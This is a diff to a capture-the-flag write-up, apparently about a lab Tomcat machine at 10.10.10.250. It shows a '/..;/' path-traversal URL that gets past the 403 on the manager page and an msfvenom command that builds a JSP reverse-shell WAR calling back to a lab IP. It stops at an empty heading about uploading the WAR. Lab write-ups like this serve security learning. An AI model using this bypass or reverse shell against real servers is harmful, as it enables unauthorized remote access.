@@ -18,4 +18,11 @@ Found password in commit history of tomcat-users.xml.
 [exploit] arisis (https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) when both nginx and tomcat are used as it is evident from issue in root/seal_market repository.
 ![[Pasted image 20210928102322.png]]
 ## Accessing http://10.10.10.250/manager/html using [exploit](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)
-http://10.10.10.250/manager/html can be accessed using [exploit](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/). First we can access known url that works like 
+http://10.10.10.250/manager/html can be accessed using [exploit](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/). First we can access known url that works like http://10.10.10.250/manager/status then use directory traversal on this url to bypass 403 forbidden like http://10.10.10.250/manager/status/..;/html (`/..;/` is used to traverse tomcat resources/directories which includes `;`, not `/../` ) like below screenshot.
+![[Pasted image 20210928103529.png]]
+## using msfvenom to create `war` reverse shell
+Using command `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.98 LPORT=1234 -f war -o sh.war` to get war reverse shell.
+![[Pasted image 20210928103728.png]]
+## uploading war file `sh.war` using burp suite repeater
+
+
